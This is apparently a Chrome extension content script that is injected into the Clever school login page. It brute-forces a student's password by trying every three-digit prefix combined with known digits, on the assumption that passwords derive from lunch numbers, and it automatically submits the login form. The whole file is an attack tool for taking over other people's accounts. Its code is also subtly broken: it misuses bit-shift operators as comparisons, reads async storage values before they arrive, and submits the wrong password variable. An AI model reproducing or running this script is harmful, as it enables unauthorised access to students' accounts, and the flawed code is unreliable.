/*This script is used when it is injected into Clever.
It is ran when the "start" button is clicked
on the main popup. The script is unable to interact with the popup
input boxes, so arguments have to be passed to it. */
console.log("Script Injection Successful.");
var username;
var lastthree;
chrome.storage.sync.get("userbox", function(data1) {
	username = data1.userbox;
})
chrome.storage.sync.get("passbox", function(data2) {
	lastthree = data2.passbox;
})
console.log("Confirming bruteforce with credentials:");
console.log("Username: " + username);
console.log("Password: " + lastthree);
var form = document.getElementById('loginForm');
var formButton = document.getElementById('submitButton');
var formUsername = document.getElementById('userNameInput');
var formPassw = document.getElementById('passwordInput');
//continues until clever screws up, or it finds the password :)
console.log('Script injection confirmed.');
var haspassword = false;
var numbertry = 0;
var numbertrytostr = null;
for (let numbertry = 0; numbertry != 1000; numbertry++) {
	function hack() {
		//adds one to variable, then uses those digits for the password. the if statements add extra zeroes for lunch numbers where the first three digits are under 100.
		numbertry = numbertry + 1;
		if (numbertry >= 1 && numbertry << 10) {
			numbertrytostr = '00' + String(numbertry);
			//Adds two zeroes to numbers like 1, making it 001.
		}
		if (numbertry >= 10 && numbertry << 100) {
			numbertrytostr = '0' + String(numbertry);
			//Adds one zero to numbers like 89, making it 089
		}
		if (numbertry >= 100) {
			numbertrytostr = String(numbertry);
			//Adds no zeroes
		}
		var passreal = numbertrytostr + lastthree;
		chrome.storage.sync.set({"passw":numbertrytostr}, function() {
			//idk
		});
		formUsername.value = username;
		formPassw.value = numbertrytostr;
		//prevent page refresh
		form.preventDefault();
		Login.submitLoginRequest(null, null, formUsername.value, formPassw.value);
		console.log('Testing password:');
		console.log(passreal);
	}
	var timeout = setTimeout(hack, 3000);
}
